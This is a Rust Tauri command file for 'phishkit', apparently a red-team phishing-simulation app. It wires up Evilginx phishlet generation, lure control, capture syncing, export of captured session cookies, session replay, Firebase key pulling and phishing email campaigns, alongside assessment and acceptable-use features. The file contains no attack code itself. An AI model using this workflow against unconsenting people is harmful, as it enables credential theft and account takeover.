use phishkit_core::assessment::{
    archive_assessment, clone_assessment, create_assessment, delete_assessment,
    get_active_assessment, get_assessment, list_assessments, list_targets, set_active_assessment,
    unarchive_assessment, update_assessment, Assessment, CreateAssessment, UpdateAssessment,
};
use phishkit_core::aup::AupStatus;
use phishkit_core::campaign::{
    Campaign, CampaignAttempt, CampaignFunnel, CaptureSendMatch, CreateCampaign,
};
use phishkit_core::community::{
    import_community_phishlet, list_active_phishlets, list_community_phishlets,
    sync_community_phishlets, CommunityPhishlet, ImportResult, SyncResult,
};
use phishkit_core::db::{CaptureRow, Profile, UpsertProfile};
use phishkit_core::destination::EnsureDestinationResult;
use phishkit_core::engagement::ResolveResult;
use phishkit_core::error::{AppError, AppResult};
use phishkit_core::evilginx_ctl::StartLureResult;
use phishkit_core::firebase::{InjectScriptResult, LaunchResult};
use phishkit_core::hosts::HostsStatus;
use phishkit_core::kit::{kit_info, KitInfo};
use phishkit_core::lure_ops::{
    delete_lure, get_default_lure, get_lure, list_lures, lures_as_ops_list, set_default_lure,
    upsert_lure, CaTrustInfo, Lure, LureOps, RedirectorInfo, UpsertLure,
};
use phishkit_core::mail::{
    EmailTemplate, ImportResult as CsvImportResult, ImportedEmailTemplate, MailAccount, Recipient,
    RecipientList, SendReceipt, SmtpSettings, UpsertMailAccount, UpsertTemplate,
};
use phishkit_core::phishlet::{GenerateResult, PatternTemplate, PhishletYaml};
use phishkit_core::readiness::{target_readiness, TargetReadiness};
use phishkit_core::recon::ReconResult;
use phishkit_core::services::{build_binaries, service_status, ServiceStatus};

#[tauri::command]
fn get_kit_info() -> AppResult<KitInfo> {
    kit_info()
}

#[tauri::command]
fn get_service_status() -> AppResult<ServiceStatus> {
    service_status()
}

#[tauri::command]
fn cmd_build() -> AppResult<String> {
    build_binaries()
}

#[tauri::command]
fn sync_community() -> AppResult<SyncResult> {
    sync_community_phishlets()
}

#[tauri::command]
fn list_community(query: Option<String>) -> AppResult<Vec<CommunityPhishlet>> {
    list_community_phishlets(query)
}

#[tauri::command]
fn import_community(name: String) -> AppResult<ImportResult> {
    import_community_phishlet(name)
}

#[tauri::command]
fn list_active() -> AppResult<Vec<String>> {
    list_active_phishlets()
}

#[tauri::command]
fn list_profiles() -> AppResult<Vec<Profile>> {
    phishkit_core::db::list_profiles()
}

#[tauri::command]
fn get_active_profile() -> AppResult<Option<String>> {
    phishkit_core::db::get_active_profile_id()
}

#[tauri::command]
fn upsert_profile(req: UpsertProfile) -> AppResult<Profile> {
    phishkit_core::db::upsert_profile(req)
}

#[tauri::command]
fn activate_profile(id: String) -> AppResult<()> {
    phishkit_core::db::set_active_profile(&id)
}

#[tauri::command]
fn delete_profile(id: String) -> AppResult<()> {
    phishkit_core::db::delete_profile(&id)
}

// `async` so Tauri runs it off the main (webview) thread; DB access is
// serialized by a global mutex, so this stays thread-safe.
#[tauri::command]
async fn get_profile(id: String) -> AppResult<Option<Profile>> {
    phishkit_core::db::get_profile(&id)
}

#[tauri::command]
fn detect_target(url: String) -> AppResult<ReconResult> {
    phishkit_core::recon::detect_target(&url)
}

#[tauri::command]
fn ensure_destination(
    target: String,
    name: Option<String>,
    overwrite: Option<bool>,
    assessment_id: Option<String>,
) -> AppResult<EnsureDestinationResult> {
    phishkit_core::destination::ensure_destination(
        target,
        name,
        overwrite.unwrap_or(false),
        assessment_id,
    )
}

#[tauri::command]
fn list_templates() -> AppResult<Vec<PatternTemplate>> {
    phishkit_core::phishlet::list_pattern_templates()
}

#[tauri::command]
fn generate_phishlet(target: String, overwrite: bool) -> AppResult<GenerateResult> {
    let r = phishkit_core::phishlet::generate_phishlet(&target, overwrite)?;
    Ok(r)
}

#[tauri::command]
fn scaffold_pattern(target: String, template_id: String) -> AppResult<GenerateResult> {
    phishkit_core::phishlet::scaffold_from_pattern(&target, &template_id)
}

#[tauri::command]
fn resolve_engagement(
    target_domain: Option<String>,
    dryrun_domain: Option<String>,
    phishlet: Option<String>,
) -> AppResult<ResolveResult> {
    phishkit_core::engagement::resolve_engagement(target_domain, dryrun_domain, phishlet)
}

#[tauri::command]
fn hosts_status(dryrun_domain: String, phishlet: Option<String>) -> AppResult<HostsStatus> {
    phishkit_core::hosts::hosts_status(dryrun_domain, phishlet)
}

#[tauri::command]
fn hosts_fix(dryrun_domain: String, phishlet: Option<String>) -> AppResult<serde_json::Value> {
    phishkit_core::hosts::hosts_fix(dryrun_domain, phishlet)
}

#[tauri::command]
fn evilginx_start_lure(
    profile_id: String,
    dryrun_domain: String,
    phishlet_name: String,
    lure_ops: Option<LureOps>,
) -> AppResult<StartLureResult> {
    phishkit_core::evilginx_ctl::start_with_lure(profile_id, dryrun_domain, phishlet_name, lure_ops)
}

#[tauri::command]
fn evilginx_stop() -> AppResult<String> {
    phishkit_core::evilginx_ctl::stop()
}

#[tauri::command]
fn list_redirectors() -> AppResult<Vec<RedirectorInfo>> {
    phishkit_core::lure_ops::list_redirectors()
}

#[tauri::command]
fn ca_trust_info() -> AppResult<CaTrustInfo> {
    phishkit_core::lure_ops::ca_trust_info()
}

#[tauri::command]
fn open_ca_cert() -> AppResult<String> {
    phishkit_core::lure_ops::open_ca_cert()
}

// —— Assessments ——

#[tauri::command]
fn cmd_list_assessments(include_archived: Option<bool>) -> AppResult<Vec<Assessment>> {
    list_assessments(include_archived.unwrap_or(false))
}

#[tauri::command]
fn cmd_get_assessment(id: String) -> AppResult<Option<Assessment>> {
    get_assessment(&id)
}

#[tauri::command]
fn cmd_create_assessment(req: CreateAssessment) -> AppResult<Assessment> {
    create_assessment(req)
}

#[tauri::command]
fn cmd_update_assessment(req: UpdateAssessment) -> AppResult<Assessment> {
    update_assessment(req)
}

#[tauri::command]
fn cmd_get_setup() -> AppResult<phishkit_core::setup::SetupConfig> {
    phishkit_core::setup::load_setup()
}

#[tauri::command]
fn cmd_complete_setup(
    config: phishkit_core::setup::SetupConfig,
) -> AppResult<phishkit_core::setup::SetupConfig> {
    phishkit_core::setup::complete_setup(config)
}

#[tauri::command]
fn cmd_set_tutorial_completed(done: bool) -> AppResult<phishkit_core::setup::SetupConfig> {
    phishkit_core::setup::set_tutorial_completed(done)
}

#[tauri::command]
fn cmd_paths_info() -> AppResult<phishkit_core::setup::PathsInfo> {
    phishkit_core::setup::paths_info()
}

#[tauri::command]
fn cmd_archive_assessment(id: String) -> AppResult<Assessment> {
    archive_assessment(&id)
}

#[tauri::command]
fn cmd_unarchive_assessment(id: String) -> AppResult<Assessment> {
    unarchive_assessment(&id)
}

#[tauri::command]
fn cmd_delete_assessment(
    id: String,
) -> AppResult<phishkit_core::assessment::DeleteAssessmentResult> {
    delete_assessment(&id)
}

#[tauri::command]
fn cmd_clone_assessment(id: String) -> AppResult<Assessment> {
    clone_assessment(&id)
}

#[tauri::command]
fn cmd_export_assessment_bundle(id: String, redact: Option<bool>) -> AppResult<serde_json::Value> {
    phishkit_core::assessment::export_bundle(&id, redact.unwrap_or(true))
}

#[tauri::command]
fn cmd_purge_assessment_data(
    id: String,
    sessions: Option<bool>,
    attempts: Option<bool>,
    pii: Option<bool>,
) -> AppResult<phishkit_core::assessment::PurgeResult> {
    phishkit_core::assessment::purge_assessment_data(
        &id,
        sessions.unwrap_or(false),
        attempts.unwrap_or(false),
        pii.unwrap_or(false),
    )
}

#[tauri::command]
fn cmd_assessment_hosts_cleanup(id: String) -> AppResult<serde_json::Value> {
    phishkit_core::assessment::hosts_cleanup(&id)
}

#[tauri::command]
fn cmd_set_active_assessment(id: String) -> AppResult<()> {
    set_active_assessment(&id)
}

#[tauri::command]
fn cmd_get_active_assessment() -> AppResult<Option<Assessment>> {
    get_active_assessment()
}

#[tauri::command]
fn cmd_list_targets(assessment_id: String) -> AppResult<Vec<Profile>> {
    list_targets(&assessment_id)
}

// —— Lures ——

#[tauri::command]
fn cmd_list_lures(profile_id: String) -> AppResult<Vec<Lure>> {
    list_lures(&profile_id)
}

#[tauri::command]
fn cmd_get_lure(id: String) -> AppResult<Option<Lure>> {
    get_lure(&id)
}

#[tauri::command]
fn cmd_get_default_lure(profile_id: String) -> AppResult<Option<Lure>> {
    get_default_lure(&profile_id)
}

#[tauri::command]
fn cmd_upsert_lure(req: UpsertLure) -> AppResult<Lure> {
    upsert_lure(req)
}

#[tauri::command]
fn cmd_delete_lure(id: String) -> AppResult<()> {
    delete_lure(&id)
}

#[tauri::command]
fn cmd_set_default_lure(profile_id: String, lure_id: String) -> AppResult<Lure> {
    set_default_lure(&profile_id, &lure_id)
}

#[tauri::command]
fn cmd_lures_as_ops_list(profile_id: String) -> AppResult<Vec<LureOps>> {
    lures_as_ops_list(&profile_id)
}

#[tauri::command]
fn get_runtime_profile() -> AppResult<Option<String>> {
    phishkit_core::db::get_runtime_profile_id()
}

#[tauri::command]
fn cmd_target_readiness(profile_id: String) -> AppResult<TargetReadiness> {
    target_readiness(profile_id)
}

#[tauri::command]
fn get_phishlet_yaml(name: String) -> AppResult<PhishletYaml> {
    phishkit_core::phishlet::get_phishlet_yaml(name)
}

#[tauri::command]
fn save_phishlet_yaml(name: String, yaml: String) -> AppResult<PhishletYaml> {
    phishkit_core::phishlet::save_phishlet_yaml(name, yaml)
}

#[tauri::command]
fn export_capture_cookies(
    profile_id: String,
    evilginx_session_id: i64,
    format: String,
) -> AppResult<String> {
    phishkit_core::sessions::export_capture_cookies(profile_id, evilginx_session_id, format)
}

#[tauri::command]
async fn campaign_funnel(campaign_id: String) -> AppResult<CampaignFunnel> {
    phishkit_core::campaign::campaign_funnel(campaign_id)
}

// Heavy: parses the whole evilginx append-only DB and upserts rows. Runs on a
// worker thread (async) so the 3s polling loop never blocks the UI.
#[tauri::command]
async fn sync_captures(profile_id: String) -> AppResult<Vec<CaptureRow>> {
    phishkit_core::sessions::sync_captures(profile_id)
}

#[tauri::command]
async fn list_captures(profile_id: String) -> AppResult<Vec<CaptureRow>> {
    phishkit_core::sessions::list_captures(profile_id)
}

#[tauri::command]
fn delete_capture(profile_id: String, evilginx_session_id: i64) -> AppResult<()> {
    phishkit_core::sessions::delete_capture(profile_id, evilginx_session_id)
}

#[tauri::command]
fn prune_captures(profile_id: String) -> AppResult<serde_json::Value> {
    phishkit_core::sessions::prune_captures(profile_id)
}

#[tauri::command]
fn pull_firebase_key(target: String) -> AppResult<serde_json::Value> {
    phishkit_core::firebase::pull_firebase_key(target)
}

#[tauri::command]
fn build_restore_script(
    capture: serde_json::Value,
    api_key: String,
    target_domain: Option<String>,
    phishlet: Option<String>,
) -> AppResult<InjectScriptResult> {
    phishkit_core::firebase::build_restore_script(capture, api_key, target_domain, phishlet)
}

#[tauri::command]
fn launch_session_replay(
    capture: serde_json::Value,
    api_key: String,
    target_domain: String,
    phishlet: String,
) -> AppResult<LaunchResult> {
    phishkit_core::firebase::launch_session_replay(capture, api_key, target_domain, phishlet)
}

#[tauri::command]
fn tail_logs(lines: Option<usize>) -> AppResult<String> {
    phishkit_core::logs::tail_evilginx_log(lines)
}

// —— Mail / campaign ——

#[tauri::command]
fn get_smtp_settings() -> AppResult<SmtpSettings> {
    phishkit_core::mail::get_smtp_settings()
}

/// Read the delivery settings bound to a specific saved sender WITHOUT changing
/// which sender is globally active. Lets a campaign preview a chosen sender's
/// readiness while leaving the Delivery default untouched.
#[tauri::command]
fn get_settings_for_account(id: String) -> AppResult<Option<SmtpSettings>> {
    phishkit_core::mail::get_settings_for_account(&id)
}

#[tauri::command]
fn save_smtp_settings(settings: SmtpSettings) -> AppResult<SmtpSettings> {
    phishkit_core::mail::save_smtp_settings(settings)
}

#[tauri::command]
fn list_mail_accounts() -> AppResult<Vec<MailAccount>> {
    phishkit_core::mail::list_mail_accounts()
}

#[tauri::command]
fn upsert_mail_account(req: UpsertMailAccount) -> AppResult<MailAccount> {
    phishkit_core::mail::upsert_mail_account(req)
}

#[tauri::command]
fn activate_mail_account(id: String) -> AppResult<MailAccount> {
    phishkit_core::mail::activate_mail_account(id)
}

#[tauri::command]
fn delete_mail_account(id: String) -> AppResult<()> {
    phishkit_core::mail::delete_mail_account(id)
}

#[tauri::command]
fn import_email_source(raw: String, filename: Option<String>) -> AppResult<ImportedEmailTemplate> {
    phishkit_core::mail::import_email_source(raw, filename)
}

#[tauri::command]
fn send_test_email(to: String) -> AppResult<SendReceipt> {
    phishkit_core::mail::send_test(to)
}

#[tauri::command]
fn list_email_templates(assessment_id: Option<String>) -> AppResult<Vec<EmailTemplate>> {
    phishkit_core::mail::list_templates(assessment_id)
}

#[tauri::command]
fn upsert_email_template(req: UpsertTemplate) -> AppResult<EmailTemplate> {
    phishkit_core::mail::upsert_template(req)
}

#[tauri::command]
fn delete_email_template(id: String) -> AppResult<()> {
    phishkit_core::mail::delete_template(id)
}

#[tauri::command]
fn list_recipient_lists(assessment_id: Option<String>) -> AppResult<Vec<RecipientList>> {
    phishkit_core::mail::list_recipient_lists(assessment_id)
}

#[tauri::command]
fn create_recipient_list(name: String, assessment_id: Option<String>) -> AppResult<RecipientList> {
    phishkit_core::mail::create_recipient_list(name, assessment_id)
}

#[tauri::command]
fn delete_recipient_list(id: String) -> AppResult<()> {
    phishkit_core::mail::delete_recipient_list(id)
}

#[tauri::command]
fn list_recipients(list_id: String) -> AppResult<Vec<Recipient>> {
    phishkit_core::mail::list_recipients(list_id)
}

#[tauri::command]
fn import_recipients_csv(list_id: String, csv_text: String) -> AppResult<CsvImportResult> {
    phishkit_core::mail::import_recipients_csv(list_id, csv_text)
}

#[tauri::command]
fn list_campaigns(assessment_id: Option<String>) -> AppResult<Vec<Campaign>> {
    phishkit_core::campaign::list_campaigns(assessment_id)
}

#[tauri::command]
fn get_campaign(id: String) -> AppResult<Option<Campaign>> {
    phishkit_core::campaign::get_campaign(&id)
}

#[tauri::command]
fn create_campaign(req: CreateCampaign) -> AppResult<Campaign> {
    phishkit_core::campaign::create_campaign(req)
}

#[tauri::command]
fn start_campaign(id: String) -> AppResult<Campaign> {
    phishkit_core::campaign::start_campaign(id)
}

#[tauri::command]
fn stop_campaign(id: String) -> AppResult<Campaign> {
    phishkit_core::campaign::stop_campaign(id)
}

#[tauri::command]
fn delete_campaign(id: String) -> AppResult<()> {
    phishkit_core::campaign::delete_campaign(id)
}

#[tauri::command]
fn retry_failed_campaign(id: String) -> AppResult<Campaign> {
    phishkit_core::campaign::retry_failed(id)
}

#[tauri::command]
fn list_campaign_attempts(campaign_id: String) -> AppResult<Vec<CampaignAttempt>> {
    phishkit_core::campaign::list_attempts(campaign_id)
}

#[tauri::command]
async fn list_campaigns_for_profile(profile_id: String) -> AppResult<Vec<Campaign>> {
    phishkit_core::campaign::list_campaigns_for_profile(profile_id)
}

#[tauri::command]
fn match_captures_to_sends(profile_id: String) -> AppResult<Vec<CaptureSendMatch>> {
    phishkit_core::campaign::match_captures_to_sends(profile_id)
}

#[tauri::command]
async fn attribute_captures(
    profile_id: String,
) -> AppResult<Vec<phishkit_core::campaign::CaptureAttribution>> {
    phishkit_core::campaign::attribute_captures(profile_id)
}

#[tauri::command]
fn send_campaign_test(campaign_id: String, to: String) -> AppResult<SendReceipt> {
    phishkit_core::campaign::send_campaign_test(campaign_id, to)
}

#[tauri::command]
fn campaign_review(campaign_id: String) -> AppResult<phishkit_core::campaign::CampaignReview> {
    phishkit_core::campaign::campaign_review(campaign_id)
}

#[tauri::command]
fn update_campaign_schedule(
    req: phishkit_core::campaign::UpdateScheduleReq,
) -> AppResult<Campaign> {
    phishkit_core::campaign::update_campaign_schedule(req)
}

#[tauri::command]
fn import_delivery_events(
    campaign_id: String,
    raw: String,
) -> AppResult<phishkit_core::campaign::EventsImport> {
    phishkit_core::campaign::import_delivery_events(campaign_id, raw)
}

#[tauri::command]
fn campaign_report(campaign_id: String) -> AppResult<phishkit_core::campaign::CampaignReport> {
    phishkit_core::campaign::campaign_report(campaign_id)
}

#[tauri::command]
fn export_campaign_report(campaign_id: String, format: String) -> AppResult<String> {
    phishkit_core::campaign::export_campaign_report(campaign_id, format)
}

#[tauri::command]
fn get_aup_status() -> AppResult<AupStatus> {
    phishkit_core::aup::get_aup_status()
}

#[tauri::command]
fn accept_aup() -> AppResult<AupStatus> {
    phishkit_core::aup::accept_aup()
}

/// Prompt for a save location and write text (macOS WKWebView ignores `<a download>`).
#[tauri::command]
fn save_text_download(
    app: tauri::AppHandle,
    default_name: String,
    contents: String,
) -> AppResult<Option<String>> {
    use tauri_plugin_dialog::DialogExt;
    let name = default_name.trim();
    let name = if name.is_empty() {
        "download.txt"
    } else {
        name
    };
    let path = app.dialog().file().set_file_name(name).blocking_save_file();
    match path {
        Some(p) => {
            let path_buf = p
                .into_path()
                .map_err(|e| AppError::msg(format!("invalid save path: {e}")))?;
            std::fs::write(&path_buf, contents.as_bytes())
                .map_err(|e| AppError::msg(format!("write failed: {e}")))?;
            Ok(Some(path_buf.display().to_string()))
        }
        None => Ok(None),
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    let _ = phishkit_core::setup::bootstrap_storage();
    let builder = tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init());

    // WebdriverIO test hooks only — keep production builds free of the test surface.
    #[cfg(feature = "test-hooks")]
    let builder = builder
        .plugin(tauri_plugin_wdio::init())
        .plugin(tauri_plugin_wdio_webdriver::init());

    builder
        .invoke_handler(tauri::generate_handler![
            get_kit_info,
            get_service_status,
            cmd_build,
            sync_community,
            list_community,
            import_community,
            list_active,
            list_profiles,
            get_active_profile,
            upsert_profile,
            activate_profile,
            delete_profile,
            get_profile,
            detect_target,
            ensure_destination,
            list_templates,
            generate_phishlet,
            scaffold_pattern,
            resolve_engagement,
            hosts_status,
            hosts_fix,
            evilginx_start_lure,
            evilginx_stop,
            list_redirectors,
            ca_trust_info,
            open_ca_cert,
            cmd_list_assessments,
            cmd_get_assessment,
            cmd_create_assessment,
            cmd_update_assessment,
            cmd_get_setup,
            cmd_complete_setup,
            cmd_set_tutorial_completed,
            cmd_paths_info,
            cmd_archive_assessment,
            cmd_unarchive_assessment,
            cmd_delete_assessment,
            cmd_clone_assessment,
            cmd_export_assessment_bundle,
            cmd_purge_assessment_data,
            cmd_assessment_hosts_cleanup,
            cmd_set_active_assessment,
            cmd_get_active_assessment,
            cmd_list_targets,
            cmd_list_lures,
            cmd_get_lure,
            cmd_get_default_lure,
            cmd_upsert_lure,
            cmd_delete_lure,
            cmd_set_default_lure,
            cmd_lures_as_ops_list,
            get_runtime_profile,
            cmd_target_readiness,
            get_phishlet_yaml,
            save_phishlet_yaml,
            export_capture_cookies,
            sync_captures,
            list_captures,
            delete_capture,
            prune_captures,
            pull_firebase_key,
            build_restore_script,
            launch_session_replay,
            tail_logs,
            get_smtp_settings,
            get_settings_for_account,
            save_smtp_settings,
            list_mail_accounts,
            upsert_mail_account,
            activate_mail_account,
            delete_mail_account,
            import_email_source,
            send_test_email,
            list_email_templates,
            upsert_email_template,
            delete_email_template,
            list_recipient_lists,
            create_recipient_list,
            delete_recipient_list,
            list_recipients,
            import_recipients_csv,
            list_campaigns,
            get_campaign,
            create_campaign,
            start_campaign,
            stop_campaign,
            delete_campaign,
            retry_failed_campaign,
            list_campaign_attempts,
            list_campaigns_for_profile,
            match_captures_to_sends,
            attribute_captures,
            campaign_funnel,
            send_campaign_test,
            campaign_review,
            update_campaign_schedule,
            import_delivery_events,
            campaign_report,
            export_campaign_report,
            get_aup_status,
            accept_aup,
            save_text_download,
        ])
        .run(tauri::generate_context!())
        .expect("error while running phishkit");
}
